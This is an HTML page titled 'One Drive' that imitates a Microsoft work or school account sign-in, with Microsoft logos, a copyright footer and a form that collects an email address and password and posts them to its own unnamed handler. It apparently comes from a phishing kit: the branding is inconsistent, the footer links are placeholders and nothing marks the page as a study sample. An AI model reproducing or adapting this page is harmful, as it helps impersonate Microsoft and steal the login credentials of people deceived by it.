<!DOCTYPE html>
<html lang="en">
 <head>
  <!-- Required meta tags -->
  <meta charset="utf-8"/>
  <meta content="text/html" http-equiv="content-type"/>
  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
  <title>
   One Drive
  </title>
  <!-- Font Awesome CSS -->
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
  <!-- Bootstrap CSS -->
  <link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" rel="stylesheet"/>
  <link href="css/style.css" rel="stylesheet" type="text/css"/>
 </head>
 <body>
  <div class="officemail">
   <div class="row">
    <div class="col-md-8 col-lg-8 col-sm-8 col-xs-12">
     <img alt="Office" class="img-fluid ofc" src="images/officebg.jpg"/>
    </div>
    <div class="col-md-4 col-lg-4 col-sm-4 col-xs-12">
     <div class="officelogo">
      <img alt="Office Logo" class="img-fluid" src="images/officelogo.png"/>
     </div>
     <div class="officetitle">
      <h6>
       Work or school Microsoft account
      </h6>
     </div>
     <div class="officeloginform">
      <form action="" class="form-horizontal" method="POST" name="office" role="form">
       <div class="row">
        <div class="col-md-10 col-xs-10">
         <h2>
          Please Login
         </h2>
         <hr/>
        </div>
       </div>
       <div class="row">
        <div class="col-md-10 col-xs-10">
         <div class="form-group orangeclr">
          <label class="sr-only" for="email">
           E-Mail Address
          </label>
          <div class="input-group mb-2 mr-sm-2 mb-sm-0">
           <div class="input-group-addon" style="width: 2.6rem">
            <i class="fa fa-at">
            </i>
           </div>
           <input autofocus="" class="form-control" id="email" name="email" placeholder="Email" required="" type="text"/>
          </div>
         </div>
        </div>
       </div>
       <div class="row">
        <div class="col-md-10 col-xs-10">
         <div class="form-group orangeclr">
          <label class="sr-only" for="password">
           Password
          </label>
          <div class="input-group mb-2 mr-sm-2 mb-sm-0">
           <div class="input-group-addon" style="width: 2.6rem">
            <i class="fa fa-key">
            </i>
           </div>
           <input class="form-control" id="password" name="password" placeholder="Password" required="" type="password"/>
          </div>
         </div>
        </div>
       </div>
       <div class="row">
        <div class="col-md-10 col-xs-10" style="padding-top: .35rem">
         <div class="form-check mb-2 mr-sm-2 mb-sm-0">
          <label class="form-check-label">
           <input class="form-check-input" name="remember" type="checkbox"/>
           <span style="padding-bottom: .15rem">
            Keep me signed in
           </span>
          </label>
         </div>
        </div>
       </div>
       <div class="row" style="padding-top: 1rem">
        <div class="col-md-10 col-xs-10">
         <input name="logintype" type="hidden" value="office"/>
         <button class="btn btn-success signin" name="submit_btn" type="submit">
          <i class="fa fa-sign-in">
          </i>
          Sign in
         </button>
         <a class="btn btn-link" href="/password/reset">
          Can't access your account?
         </a>
        </div>
       </div>
      </form>
     </div>
     <div class="footer">
      <div class="row">
       <div class="col-md-6 col-sm-6 col-xs-12 col-lg-6">
        <div class="copyrightmicrosoft">
         &copy; 2018 Microsoft
        </div>
        <ul class="footermenumicrosoft">
         <li>
          <a href="#">
           Terms
          </a>
         </li>
         <li>
          <a href="#">
           Privacy &amp; Cookies
          </a>
         </li>
        </ul>
       </div>
       <div class="col-md-6 col-sm-6 col-xs-12 col-lg-6">
        <div class="microsoftlogomt">
         <img alt="Footerlogo" src="images/microsoftlogo.png"/>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
  <!-- jQuery first, then Tether, then Bootstrap JS. -->
  <script crossorigin="anonymous" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" src="https://code.jquery.com/jquery-3.1.1.slim.min.js">
  </script>
  <script crossorigin="anonymous" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js">
  </script>
  <script crossorigin="anonymous" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js">
  </script>
 </body>
</html>
